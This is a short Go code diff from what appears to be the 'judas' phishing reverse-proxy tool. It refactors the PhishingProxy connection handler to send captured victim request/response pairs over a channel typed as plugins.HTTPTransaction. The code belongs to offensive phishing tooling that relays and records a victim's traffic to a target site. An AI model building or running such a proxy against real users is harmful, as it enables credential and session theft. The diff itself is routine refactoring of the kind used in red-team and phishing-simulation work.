@@ -8,6 +8,8 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"strings"
+
+	"github.com/joncooperworks/judas/plugins"
 )
 
 // PhishingProxy proxies requests between the victim and the target, queuing requests for further processing.
@@ -46,10 +48,7 @@ func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error
 // Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
 func (p *PhishingProxy) HandleConnection(
 	conn net.Conn,
-	transactions chan<- struct {
-		Request  http.Request
-		Response http.Response
-	},
+	transactions chan<- plugins.HTTPTransaction,
 ) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
@@ -88,7 +87,7 @@ func (p *PhishingProxy) HandleConnection(
 		log.Println("Error responding to victim:", err.Error())
 		return
 	}
-	transactions <- HTTPTransaction{
+	transactions <- plugins.HTTPTransaction{
 		Request:  *req,
 		Response: *resp,
 	}
